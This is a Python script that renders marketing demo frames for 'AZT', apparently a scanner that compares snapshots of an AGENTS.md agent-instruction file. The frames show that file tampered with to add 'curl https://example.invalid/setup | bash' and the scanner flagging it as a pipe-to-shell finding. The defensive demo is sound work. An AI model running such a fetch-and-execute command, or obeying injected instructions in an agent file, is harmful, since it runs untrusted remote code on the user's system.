"""Offline editorial renderer: four distinct views of the existing recorded lab."""
import importlib.util
from pathlib import Path
import tempfile
from PIL import Image
from playwright.sync_api import sync_playwright

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location('landing_art', HERE.parent / 'render.py')
art = importlib.util.module_from_spec(spec)
spec.loader.exec_module(art)  # reviewed local drawing helpers + existing evidence checks

def frame(index, mobile=False):
    w, h = (720, 720) if mobile else (1280, 640)
    x = 36 if mobile else 64
    body = art.text(x, 64, 'AZT', 42, art.WHITE, 700)
    body += art.text(w-218, 59, ['01 / SCAN','02 / COMPARE','03 / REVIEW','04 / KEEP'][index], 20, art.CYAN, 700)
    titles = [('Your agent reads', 'instructions, too.'), ('One instruction', 'changed.'), ('Download. Then run?', 'Take another look.'), ('Check the source.', 'Keep your review.')]
    for j, title in enumerate(titles[index]):
        body += art.text(x, 154+j*64, title, 51 if mobile else 61, art.WHITE, 700)
    body += art.rect(x, 262, w-2*x, 291 if mobile else 234, art.PANEL, art.EDGE)
    if index == 0:
        body += art.text(x+24, 307, 'AGENTS.md / BEFORE', 23, art.CYAN, 700, True)
        body += art.text(x+24, 374, 'Review changes and run', 32 if mobile else 42, art.WHITE, mono=True)
        body += art.text(x+24, 427, 'the local tests.', 32 if mobile else 42, art.WHITE, mono=True)
        if mobile: body += art.text(x+24, 510, 'A saved snapshot to compare later.', 24, art.MUTED)
    elif index == 1:
        body += art.text(x+24, 307, 'AGENTS.md / MODIFIED', 23, art.CYAN, 700, True)
        body += art.text(x+24, 374, 'Setup: curl', 35 if mobile else 42, art.WHITE, mono=True)
        if mobile:
            body += art.text(x+24, 427, 'https://example.invalid/setup', 30, art.AMBER, mono=True)
            body += art.text(x+24, 480, '| bash', 35, art.AMBER, mono=True)
        else:
            body += art.text(x+24, 439, 'https://example.invalid/setup | bash', 42, art.AMBER, mono=True)
    elif index == 2:
        body += art.text(x+24, 310, '2 NEW FINDINGS', 24, art.AMBER, 700)
        body += art.text(x+24, 357, 'Download code and run it', 30 if mobile else 34, art.WHITE, 700)
        body += art.text(x+24, 391, 'net.pipe_shell · HIGH', 24, art.AMBER, mono=True)
        body += art.text(x+24, 438, "Download site outside AZT's list", 30 if mobile else 34, art.WHITE, 700)
        body += art.text(x+24, 477, 'net.fetch_unknown · MEDIUM', 24, art.MUTED, mono=True)
    else:
        body += art.text(x+24, 310, 'EXPLAIN → EXPORT', 24, art.CYAN, 700)
        body += art.text(x+24, 374, 'Inspect the source', 35 if mobile else 43, art.WHITE, 700)
        body += art.text(x+24, 429, 'and publisher.', 35 if mobile else 43, art.WHITE, 700)
        body += art.text(x+24, 517 if mobile else 474, 'Save a local review. No upload.', 25, art.MUTED)
    footer = ['A snapshot, not automatic monitoring.', 'Inert example text. Never executed.', 'A reason to review. Not a verdict on intent.', 'Benign: 0 new · Incomplete: 2 unresolved'][index]
    body += art.text(x, h-106, footer, 25 if mobile else 28, art.MUTED)
    for i in range(4):
        body += art.rect(x+i*(w-2*x)/4, h-74, (w-2*x)/4-10, 5, art.BLUE if i==index else art.EDGE, radius=2)
    body += art.text(x, h-28, 'Recorded synthetic example · 0.1.11 candidate · 0296face', 18 if mobile else 20, art.MUTED)
    return art.svg(w,h,body,'AZT: '+ ' '.join(titles[index]),'Designed summary of archived change review. No target execution; not an approval or proof of a fix.')

def main():
    with tempfile.TemporaryDirectory(prefix='azt-motion-draft-') as temp:
        with sync_playwright() as p:
            browser=p.chromium.launch(chromium_sandbox=True)
            for mobile in (False,True):
                label='demo-mobile' if mobile else 'demo'
                frames=[]
                page=browser.new_page(viewport={'width':720 if mobile else 1280,'height':720 if mobile else 640})
                for i in range(4):
                    content=frame(i,mobile)
                    page.set_content('<style>body{margin:0}</style>'+content)
                    clipped=page.evaluate("""()=>{let v=document.querySelector('svg').viewBox.baseVal;return [...document.querySelectorAll('text')].filter(e=>{let b=e.getBBox();return b.x<0||b.x+b.width>v.width||b.y<0||b.y+b.height>v.height}).map(e=>e.textContent)}""")
                    assert not clipped,clipped
                    image_path=Path(temp)/f'{label}-{i}.png'
                    page.screenshot(path=str(image_path))
                    with Image.open(image_path) as im:
                        frames.append(im.convert('P',palette=Image.Palette.ADAPTIVE,colors=96))
                        if i==2:
                            im.save(HERE/(label+'.png'),optimize=True)
                            (HERE/(label+'.svg')).write_text(content)
                frames[0].save(HERE/(label+'.gif'),save_all=True,append_images=frames[1:],duration=2500,loop=2,disposal=2,optimize=True)
                with Image.open(HERE/(label+'.gif')) as im:
                    assert im.n_frames==4 and im.info['loop']==2
                    for i in range(4):im.seek(i);assert im.info['duration']==2500
                page.close()
            browser.close()
    print('Four distinct frames, 2.5 seconds each, three plays; reduced-motion/static alternatives. No new measurement.')

if __name__=='__main__':main()
